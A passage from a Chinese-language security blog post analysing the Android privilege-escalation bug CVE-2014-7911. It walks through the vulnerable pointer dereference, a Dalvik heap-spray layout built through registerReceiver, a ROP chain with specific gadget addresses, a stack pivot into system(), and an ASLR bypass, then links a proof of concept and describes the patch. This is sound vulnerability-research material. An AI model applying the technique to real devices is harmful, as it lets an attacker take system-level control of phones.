<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(*(*(mOrgue+4))==1)&#123;</div><div class="line">    refs = *(mOrgue+4)</div><div class="line">    r2 = *(*(*(refs+8))+12)</div><div class="line">    blx r2  -----&gt;获取控制权</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其中mOrgue是攻击者可控的，经过三重指针的解引用，最终以system_server(uid=1000)的权限跳转到攻击者可控的地址执行代码，从而实现从普通用户到system用户的提权。</p>
<h3 id="0x01-Dalvik-heap-Spray"><a href="#0x01-Dalvik-heap-Spray" class="headerlink" title="0x01 Dalvik-heap Spray"></a>0x01 Dalvik-heap Spray</h3><p>为了使上述blx r2这条指令可靠稳定地跳转到执行攻击者可控的代码，需要使用堆喷射技术，在system_server内存空间的dalvik-heap中预先布置大量的Spray Buffer, 其中放置提权代码以及大量指向该提权代码的地址。这涉及到两个问题。</p>
<ol>
<li>如何向sysetem_server的dalvik-heap空间传入可控字符串？</li>
<li>如何在dalvik-heap中布局这些可控字符串，才能在每次漏洞利用时都稳定执行代码？</li>
</ol>
<p>对于第一个问题，我们知道system_server向android系统提供绝大多数的系统服务，通过这些服务的一些特定方法可以向system_server传入String，同时system_server把这些String存储在Dalvik-heap中，在GC之前都不会销毁。例如，下面android.content.Context中的registerReceiver方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">public Intent registerReceiver (BroadcastReceiver receiver, IntentFilter filter, String broadcastPermission, Handler scheduler)</div></pre></td></tr></table></figure>
<p>其中broadcastPermission为String类型，调用该方法后，String Buffer将常驻system_server进程空间。具体调用链见</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ContextWrapper.registerReceiver-&gt;ContextImpl.registerReceiver-&gt;ContextImpl.registerReceiverInternal-&gt;ActivityManagerProxy.registerReceiver-&gt;ActivityManagerService.registerReceiver</div></pre></td></tr></table></figure>
<p>该调用链表明可从某个app的Context通过binder IPC跨进程调用system_server的ActivityManagerService.registerReceiver方法，注意ActivityManagerService常驻system_server进程空间。我们再看看ActivityManagerService的registerReceiver方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">public Intent registerReceiver(IApplicationThread caller, String callerPackage, IIntentReceiver receiver, IntentFilter filter, String permission, int userId) &#123;</div><div class="line">enforceNotIsolatedCaller(&quot;registerReceiver&quot;);</div><div class="line">	int callingUid;</div><div class="line">	int callingPid;</div><div class="line">	synchronized(this) &#123;</div><div class="line">		......</div><div class="line">	    ReceiverList rl</div><div class="line">	        = (ReceiverList)mRegisteredReceivers.get(receiver.asBinder());</div><div class="line">	    ......</div><div class="line">	    BroadcastFilter bf = new BroadcastFilter(filter, rl, callerPackage,</div><div class="line">            permission, callingUid, userId); //在Dalvik-heap中分配内存</div><div class="line">	    rl.add(bf);</div><div class="line">	    ......</div><div class="line">	    return sticky;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意上面的new将在system_server进程的Dalvik-heap堆中分配内存，传入的String Buffer即permission将常驻system_server进程空间。这样，第一个问题解决了。</p>
<p>下面探讨第二个问题：如何在dalvik-heap中布局这些可控字符串，才能在每次漏洞利用时都能稳定执行代码？</p>
<p>根据前面的叙述，攻击者可控的mOrgue需要指向一个可读的内存区域，简单地让其指向传入registerReceiver方法permission参数String Buffer所属的地址区域并在String Buffer中布置ROP Gadget即可达到这个目的，但system_server在其dalvik-heap中分配String Buffer的偏移地址却是未知的，mOrgue未必能命中（指向）堆块中为String Buffer分配的内存。为了提高命中率，需要在dalvik-heap中分配大量的String Buffer，这就是Heap Spray(堆喷射)技术，反复调用registerReceiver方法分配大量的String Buffer即可完成Heap Spray。但是，String Buffer的地址在每次调用registerReceiver方法分配内存时都会不一样，这就需要构造一种特殊的堆喷射布局，包含递减的指针值[2]，如图。</p>
<p><img src="/2015/05/25/cve-2014-7911/CVE-2014-7911.png" alt="image"></p>
<p>如图，每一个在堆中分配的内存块(chunk)，都包含Relative Address Chunk和Gadget_buffer两部分，目标是使可控的STATIC_ADDRESS（即mOrgue）位于Relative Address Chunk，并且使其存放的内容[STATIC_ADDRESS]=GADGET_BUFFER（即Gadget_buffer的地址）。简单的思路就是在每个chunk的relative Address Chunk中都放入GADGET_BUFFER，然而由于GADGET_BUFFER在每个chunk中都不一样，而且也无法在跨进程传入system_server之前提前知晓，因此该思路并不可行。</p>
<p>注意，GADGET_BUFFER = 堆底地址 + Gadget_buffer_offset(即Gadget_Buffer相对于堆底的偏移)。当STATIC_ADDRESS=堆底地址时，GADGET_BUFFER = STATIC_ADRRESS+Gadget_buffer_offset；考虑到四字节对齐，一般情况下，STATIC_ADDRESS=堆底地址+4N（N=1,2,…），此时GADGET_BUFFER = STATIC_ADDRESS + Gadget_buffer_offset - 4N。因此，在每一个Chunk的Relative Address Chunk区域按地址增长方向，依次在内存中填入STATIC_ADDRESS+Gadget_buffer_offset、STATIC_ADDRESS+Gadget_buffer_offset-4、…、STATIC_ADDRESS+Gadget_buffer_offset-4N。这样，给定一个STATIC_ADDRESS，只要能落入system_server在dalvik heap分配的Relative Addresses Chunk的地址范围(为了提高这个可能性，需要满足<br> 1.每一个Chunk的Relative Address Chunk比Gadget Buffer大很多；2.分配大量这样的Chunk），就总是存在[STATIC_ADDRESS]=GADGET_BUFFER，并满足[STATIC_ADDRESS+4N]=GADGET_BUFFER-4N（这个条件将在后面布置Gadget时用到）。<br>按照这样的布局，回过来再看汇编代码，布置Gadget_Buffer。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ldr     r4, [r0, #4]   # r0=STATIC_ADDRESS--&gt;r4=[STATIC_ADDRESS+4]=GADGET_BUFFER-4</div><div class="line">mov     r6, r1</div><div class="line">mov     r0, r4  # r0=GADGET_BUFFER-4</div><div class="line">blx     &lt;android_atomic_dec ()&gt;</div></pre></td></tr></table></figure>
<p>调用android_atomic_dec函数之后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cmp     r0, #1          # r0 = [GADGET_BUFFER-4]</div><div class="line">bne.n   d1ea</div><div class="line">ldr     r0, [r4, #8]    # r0 = [GADGET_BUFFER-4+8] = [GADGET_BUFFER+4]</div><div class="line">mov     r1, r6</div><div class="line">ldr     r3, [r0, #0]    # r3 =[[GADGET_BUFFER+4]] = [STATIC_ADDRESS+12] = GADGET_BUFFER-12</div><div class="line">ldr     r2, [r3, #12]   # r2 = [GADGET_BUFFER -12 +12] = [GADGET_BUFFER]</div><div class="line">blx     r2</div></pre></td></tr></table></figure>
<p>首先，为了进入blx r2这条分支，r0必须等于1，也就是[GADGET_BUFFER-4]=1；其次，[GADGET_BUFFER+4]必须为一个合法可读的地址，为了方便之后的布局，我们令[GADGET_BUFFER+4]=STATIC_ADDRESS+12，因此r3 = [STATIC_ADDRESS+12]=GADGET_BUFFER-12,接下来r2=[r3+12]=[GADGET_BUFFER-12+12]=[GADGET_BUFFER]，程序将跳转到GADGET_BUFFER这个地址存放的内容执行，因此在这里就可以布置ROP Gadget1的地址了。</p>
<h3 id="0x02-ROP-Chain"><a href="#0x02-ROP-Chain" class="headerlink" title="0x02 ROP Chain"></a>0x02 ROP Chain</h3><p>由于Android使用了DEP，因此Dalvik-heap上的内存不能用来执行，这就必须使用ROP技术，使PC跳转到一系列合法指令序列（Gadget），并由这些Gadget“拼凑”而成shellcode。这里我们将使用ROP Gadget调用system函数执行代码。</p>
<p>使用ROPGadget这个工具，在zygote加载的基础模块（如libc.so、libwebviewchromium.so、libdvm.so）上进行搜索，把arm code当做thumb code来搜索，可以增加更多的候选指令序列。</p>
<p>为了调用system函数，需要控制r0寄存器，指向我们预先布置的命令行字符串作为参数。这里需要使用Stack Pivot技术，将栈顶指针SP指向控制的Dalvik-heap堆中的数据，这将为控制PC寄存器、以及在栈上布置数据带来便利。利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget --thumb --binary libwebviewchromium.so</div></pre></td></tr></table></figure>
<p>可找到如下Gadget</p>
<h4 id="Gadget1"><a href="#Gadget1" class="headerlink" title="Gadget1"></a>Gadget1</h4><p>为Stack Pivot作准备</p>
<p>in libwebviewchromium.so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">70a93c:       682f            ldr     r7, [r5, #0]  #r5=STATIC_ADDRESS, r7=[STATIC_ADDRESS]=GADGET_BUFFER</div><div class="line">70a93e:       4628            mov     r0, r5       #r0=STATIC_ADDRESS</div><div class="line">70a940:       68b9            ldr     r1, [r7, #8] #r1=[GADGET_BUFFER+8]</div><div class="line">70a942:       4788            blx     r1</div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">4fed02:       4628            mov     r0, r5           #r5 = STATIC_ADDRESS</div><div class="line">4fed04:       682f            ldr     r7, [r5, #0]     #r7 = [STATIC_ADDRESS] = GADGET_BUFFER</div><div class="line">4fed06:       f8d4 8048       ldr.w   r8, [r4, #72]   ; 0x48</div><div class="line">4fed0a:       68b9            ldr     r1, [r7, #8]     #r1 = [GADGET_BUFFER+8]</div><div class="line">4fed0c:       4788            blx     r1</div></pre></td></tr></table></figure>
<p>因此，GADGET_BUFFER+8这个地址需要指向第二个Gadget</p>
<h4 id="Gadget2"><a href="#Gadget2" class="headerlink" title="Gadget2"></a>Gadget2</h4><p>Stack Pivot</p>
<p>in libdvm.so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">664c4:       f107 0708       add.w   r7, r7, #8   #r7=r7+8=GADGET_BUFFER+8</div><div class="line">664c8:       46bd            mov     sp, r7       #sp=GADGET_BUFFER+8</div><div class="line">664ca:       bdb0            pop     &#123;r4, r5, r7, pc&#125;</div><div class="line"># r4=[GADGET_BUFFER+8],r5=[GADGET_BUFFER+12],r7=[GADGET_BUFFER+16],pc=[GADGET_BUFFER+20], sp=GADGET_BUFFER+24</div></pre></td></tr></table></figure>
<p>可以看到，将SP指向堆中可控的数据后，后面就可以控制PC。这里，我们提前将system函数的地址写入[GADGET_BUFFER+12]。为什么要通过Gadget1的过渡才能来到Gadget2，事实上这是不得已而为之，使用ROPGadget搜遍/system/lib下的基础模块grep “mov sp,r”，只发现mov sp,r7，因此只能采取这种过渡的方式。</p>
<p>接下来，在GADGET_BUFFER+20这个地址填入Gadget3的地址</p>
<h4 id="Gadget3"><a href="#Gadget3" class="headerlink" title="Gadget3"></a>Gadget3</h4><p>in libwebviewchromium.so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">30c4b8:       4668            mov     r0, sp   #r0=GADGET_BUFFER+24</div><div class="line">30c4ba:       47a8            blx     r5       #r5=[GADGET_BUFFER+12]=system_addr</div></pre></td></tr></table></figure>
<p>因此，提前将system函数的参数放入r0指向的GADGET_BUFFER+24即可，最终将以system_server的权限执行任意代码。</p>
<p>最终的chunk布局如图。</p>
<p><img src="/2015/05/25/cve-2014-7911/Chunk.png" alt="image"></p>
<p>最后，构造ROP Chain还需要考虑一个细节，ARM有两种模式Thumb和ARM模式，我们使用的Gadgets均为Thumb模式，因此其地址的最低位均需要加1。</p>
<h3 id="0x03-ASLR"><a href="#0x03-ASLR" class="headerlink" title="0x03 ASLR"></a>0x03 ASLR</h3><p>Android 自4.1始开始启用ASLR（地址随机化），任何程序自身的的地址空间在每一次运行时都将发生变化。但在Android中，攻击程序、system_server皆由zygote进程fork而来，因此攻击程序与system_server共享同样的基础模块和dalvik-heap。只要在使用dalvik heapspray和构建ROP Gadget时，只使用libc、libdvm这些基础模块，就无需考虑地址随机化的问题。通过对攻击程序自身/proc/\<pid\>/maps文件的解析，就可以得知所加载基础模块的基址。如图，</pid\></p>
<p><img src="/2015/05/25/cve-2014-7911/noaslr.png" alt="image"></p>
<p>根据上述Gadgets构建的POC见<a href="https://github.com/heeeeen/CVE-2014-7911poc" target="_blank" rel="external">https://github.com/heeeeen/CVE-2014-7911poc</a><br>，执行完毕后，将以system用户的权限在/data目录下生成一个pwned.txt文件。</p>
<h3 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h3><p>见<a href="https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2%5E%21/#F0" target="_blank" rel="external">https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2%5E%21/#F0</a>，涉及与反序列化相关的<br>ObjectInputStream.java、ObjectStreamClass.java、ObjectStreamConstants.java、SerializationTest.java等文件。主要加了三种检查：</p>
<ol>
<li>检查反序列化的类是否仍然满足序列化的需求；</li>
<li>检查反序列化的类的类型是否与stream中所持有的类型信息 (enum, serializable, externalizable)一致；</li>
<li>在某些情形下，延迟类的静态初始化，直到对序列化流的内容检查完成。</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.<a href="http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation" target="_blank" rel="external">http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation</a></p>
<p>2.<a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-7911_poc</a></p>
<p>3.<a href="https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf" target="_blank" rel="external">https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf</a> </p>
<p>4.<a href="http://secauo.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html" target="_blank" rel="external">http://secauo.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html</a> </p>
</div><div class="tags"><a href="/tags/android/">android</a></div><div class="post-nav"><a href="/2015/07/12/android-open-port/" class="pre">浅谈Android开放网络端口的安全风险</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/IOS/">IOS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Malware分析/">Malware分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/二进制安全/">二进制安全</a></li></ul></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-drozer/" style="font-size: 15px;">android drozer</a> <a href="/tags/cknife/" style="font-size: 15px;">cknife</a> <a href="/tags/antiav/" style="font-size: 15px;">antiav</a> <a href="/tags/wannacry/" style="font-size: 15px;">wannacry</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/Moto-bootloader-exploit/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/28/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/name-spoof/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/06/bypass360-analysis/">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/14/wannacry/">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/04/Bluetoooth_Vul_1/">蓝牙App漏洞系列分析之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/21/android-telephony-dos/">Android Telephony拒绝服务漏洞（CVE-2016-6763）分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/08/details-telephodos/">Details of Denial of service vulnerability in Telephony  [CVE-2016-6763]</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>